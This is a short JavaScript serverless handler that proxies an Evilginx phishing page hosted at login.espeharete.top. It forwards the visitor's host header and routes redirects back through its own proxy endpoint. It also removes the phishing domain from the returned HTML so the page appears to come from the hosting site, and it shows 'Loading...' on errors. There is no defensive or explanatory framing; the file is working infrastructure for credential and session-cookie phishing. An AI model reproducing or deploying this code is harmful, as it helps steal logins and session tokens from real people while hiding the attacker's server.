export default async (req, res) => {
  const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob";
  
  try {
    // 1. Fetch Evilginx page (ignore SSL errors)
    const response = await fetch(EVILGINX_URL, {
      headers: {
        'X-Forwarded-Host': req.headers.host,
        'User-Agent': 'Mozilla/5.0'
      },
      redirect: 'manual' // Critical for Evilginx
    });

    // 2. Handle Evilginx redirects
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('location');
      return res.redirect(302, `/api/proxy?redirect=${encodeURIComponent(location)}`);
    }

    // 3. Return cleaned HTML
    let html = await response.text();
    html = html.replace(/https:\/\/login\.espeharete\.top/g, '');
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
    
  } catch (error) {
    res.status(500).send('Loading...');
  }
};
